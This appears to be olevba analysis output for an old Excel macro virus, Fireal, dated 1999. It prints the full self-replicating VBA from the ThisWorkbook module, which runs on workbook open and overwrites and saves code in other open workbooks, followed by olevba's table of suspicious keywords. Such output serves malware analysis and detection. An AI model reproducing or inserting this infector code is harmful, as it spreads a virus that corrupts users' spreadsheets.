olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Fireal-4053723af00d8313aa5e00e4f1ceb9eb69f0e44b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Fireal-4053723af00d8313aa5e00e4f1ceb9eb69f0e44b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'fireal
Private Sub Workbook_Open()
On Error Resume Next
For Each fireal In ThisWorkbook.VBProject.VBComponents
If fireal.Properties.Count = 73 Then ourcode = fireal.codemodule.Lines(1, 20)
Next
For Each book In Workbooks
For Each fireal In book.VBProject.VBComponents
If fireal.Properties.Count = 73 And fireal.codemodule.Lines(1, 1) <> "'fireal" Then
fireal.codemodule.deletelines 1, fireal.codemodule.countoflines
fireal.codemodule.insertlines 1, ourcode
If book.Path = "" Then book.SaveAs book.FullName Else book.Save
End If
Next
Next
End Sub
'x97m.fireal (c) 1999 jackie
'1st language independent excel class infector
'No backdrops and no lights can focus on that shit...Linezer0 '1999
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSExcel.Fireal-4053723af00d8313aa5e00e4f1ceb9eb69f0e44b - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSExcel.Fireal-4053723af00d8313aa5e00e4f1ceb9eb69f0e44b - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSExcel.Fireal-4053723af00d8313aa5e00e4f1ceb9eb69f0e44b - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

